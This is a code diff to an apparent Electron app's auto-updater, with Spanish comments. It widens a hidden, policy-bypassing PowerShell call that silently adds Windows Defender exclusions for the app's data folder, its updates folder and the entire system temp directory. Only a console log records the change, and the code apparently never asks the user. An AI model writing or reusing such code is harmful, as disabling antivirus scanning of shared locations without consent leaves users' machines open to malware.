@@ -175,14 +175,16 @@ function setupAutoUpdater() {
   // el blockmap de la versión anterior no coincide con la nueva.
   autoUpdater.disableDifferentialDownload = true;
 
-  // Asegurar exclusión de Defender para la carpeta de Updates
-  // (cubre casos donde el instalador anterior no aplicó las exclusiones correctamente)
+  // Excluir de Defender: userData, Updates, y el directorio temp del sistema
+  // (electron-updater descarga a temp aunque se configure cachePath)
   if (process.platform === 'win32') {
     const { exec } = require('child_process');
+    const os = require('os');
     const userDataDir = app.getPath('userData');
-    const cmd = `powershell.exe -NonInteractive -WindowStyle Hidden -ExecutionPolicy Bypass -Command "try { Add-MpPreference -ExclusionPath '${userDataDir}' -Force -ErrorAction SilentlyContinue; Add-MpPreference -ExclusionPath '${updatesDir}' -Force -ErrorAction SilentlyContinue } catch {}"`;
+    const tempDir = os.tmpdir();
+    const cmd = `powershell.exe -NonInteractive -WindowStyle Hidden -ExecutionPolicy Bypass -Command "try { Add-MpPreference -ExclusionPath '${userDataDir}' -Force -ErrorAction SilentlyContinue; Add-MpPreference -ExclusionPath '${updatesDir}' -Force -ErrorAction SilentlyContinue; Add-MpPreference -ExclusionPath '${tempDir}' -Force -ErrorAction SilentlyContinue } catch {}"`;
     exec(cmd, () => {
-      console.log('[updater] Exclusiones de Defender aplicadas para:', userDataDir);
+      console.log('[updater] Exclusiones de Defender aplicadas para:', userDataDir, '|', tempDir);
     });
   }
 
